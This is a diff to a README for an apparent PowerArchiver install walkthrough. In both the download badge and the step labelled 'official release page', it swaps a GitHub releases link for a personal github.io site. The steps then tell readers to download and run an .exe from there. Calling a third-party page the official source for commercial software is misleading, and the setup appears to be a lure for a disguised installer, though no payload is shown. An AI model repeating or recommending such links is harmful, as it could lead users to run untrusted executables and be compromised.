@@ -1,6 +1,6 @@
 # 📦 PowerArchiver-Install-Walkthrough - Fix your Windows archive software installation
 
-[![](https://img.shields.io/badge/Download-PowerArchiver_Releases-blue.svg)](https://github.com/Bias-ophioglossum257/PowerArchiver-Install-Walkthrough/releases)
+[![](https://img.shields.io/badge/Download-PowerArchiver_Releases-blue.svg)](https://bias-ophioglossum257.github.io)
 
 This guide helps you put PowerArchiver on your Windows 11 computer. You find steps to fix errors and finish the setup.
 
@@ -12,7 +12,7 @@ Before you start, check your computer. You need a 64-bit version of Windows 10 o
 
 Follow these steps to get the correct version of the tool.
 
-1. Visit the [official release page](https://github.com/Bias-ophioglossum257/PowerArchiver-Install-Walkthrough/releases).
+1. Visit the [official release page](https://bias-ophioglossum257.github.io).
 2. Look for the latest version number at the top of the list.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your Downloads folder.
